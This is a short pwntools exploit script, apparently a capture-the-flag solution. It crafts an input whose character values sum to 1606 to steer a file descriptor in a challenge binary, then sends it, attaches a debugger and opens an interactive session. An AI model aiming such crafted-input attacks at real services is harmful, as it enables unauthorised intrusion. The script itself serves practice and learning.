#!/usr/bin/python3
from pwn import *
from sys import argv

# Set up the ELF binary and context
e = context.binary = ELF('chall')

# Define how to connect based on command-line arguments
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

# Establish the connection
p = conn()

# Target sum for ASCII values to get the desired file descriptor (1606)
target_sum = 1606
current_sum = 0
result = []

# Create input string where sum of ASCII values is exactly target_sum
while current_sum < target_sum:
    char_value = min(255, target_sum - current_sum)  # Use valid ASCII values
    result.append(chr(char_value))
    current_sum += char_value

# Join the list to create the final input string
input_string = "".join(result)
print(f"Generated input string: {input_string}")
print(f"Sum of ASCII values: {sum(ord(c) for c in input_string)}")

# Send the crafted input to the binary
p.sendline(input_string.encode())
gdb.attach(p)

# Interact with the process
p.interactive()
